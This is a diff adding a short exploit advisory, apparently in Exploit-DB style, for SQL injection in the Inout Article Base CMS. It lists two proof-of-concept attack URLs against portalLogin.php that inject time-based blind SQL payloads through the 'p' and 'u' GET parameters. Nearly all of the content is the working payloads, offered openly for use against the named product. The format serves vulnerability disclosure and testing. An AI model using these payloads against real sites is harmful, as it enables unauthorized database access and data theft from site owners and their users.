@@ -1,0 +1,22 @@
+# Exploit Title: Inout Article Base CMS - SQL Injection
+# Date: 21.03.2019
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://www.inoutscripts.com/products/inout-article-base/
+# Demo Site: http://www.inoutwebportal.com
+# Version: Lastest
+# Tested on: Kali Linux
+# CVE: N/A
+
+----- PoC 1: SQLi -----
+
+Request: http://localhost/[PATH]/articles/portalLogin.php
+Vulnerable Parameter: p (GET)
+Attack Pattern:
+http://locahost/[PATH]/articles/portalLogin.php?d=65ded5353c5ee48d0b7d48c591b8f430&p=0'XOR(if(now()=sysdate()%2Csleep(0)%2C0))XOR'Z&u=test
+
+----- PoC 2: SQLi -----
+
+Request: http://localhost/[PATH]/articles/portalLogin.php
+Vulnerable Parameter: u (GET)
+Attack Pattern:
+http://locahost/[PATH]/articles/portalLogin.php?d=65ded5353c5ee48d0b7d48c591b8f430&p=fe01ce2a7fbac8fafaed7c982a04e229&u=0'XOR(if(now()=sysdate()%2Csleep(0)%2C0))XOR'Z
